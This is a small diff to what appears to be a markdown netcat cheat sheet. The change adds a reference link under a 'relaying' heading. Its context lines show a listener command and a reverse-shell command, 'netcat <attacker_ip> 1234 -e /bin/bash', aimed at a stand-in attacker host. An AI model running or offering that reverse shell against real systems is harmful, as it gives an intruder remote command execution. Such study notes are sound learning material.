@@ -64,6 +64,8 @@ netcat -l -p 1234
 netcat <attacker_ip> 1234 -e /bin/bash
 ```
 ## relaying
+Refs
+* <https://www.youtube.com/watch?v=FLoe9S4TASk>
 ### server client relay
 ```
    ------                 -------------                 ----- 
